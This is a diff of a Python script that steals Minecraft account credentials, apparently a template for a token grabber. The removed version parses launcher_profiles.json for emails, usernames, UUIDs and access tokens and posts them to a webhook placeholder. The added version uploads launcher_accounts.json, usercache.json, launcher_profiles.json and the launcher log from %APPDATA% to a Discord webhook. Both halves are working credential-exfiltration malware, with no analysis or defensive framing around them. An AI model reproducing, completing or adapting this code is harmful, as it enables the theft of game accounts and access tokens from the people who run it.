@@ -1,47 +1,16 @@
-import json
-import os
-from urllib.request import Request, urlopen
-#Imports
-WEBHOOK_URL = "%webhook%"
+import os, json
+from discord_webhook import DiscordWebhook
 
-PING_ME = True
+webhook = DiscordWebhook(url='%webhook%')
 
-def uuid_dashed(uuid):
-    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
+apd = os.getenv('APPDATA')
+mc = apd + "\.minecraft\\"
 
-def main():
-    auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]
+files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
+for x in files:
+    with open(mc + x, "rb") as f:
+        if (x == 'launcher_accounts.json'):
+            x = f"USED_TO_LOGIN-{x}"
+        webhook.add_file(file=f.read(), filename=x)
 
-    embeds = []
-
-    for x in auth_db:
-        try:
-            email = auth_db[x].get("username")
-            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
-            embed = {
-                "fields": [
-                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
-                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
-                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
-                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
-                ]
-            }
-            embeds.append(embed)
-        except:
-            pass
-
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-    }
-
-    payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
-    
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
-
-if __name__ == "__main__":
-    main()
+response = webhook.execute()
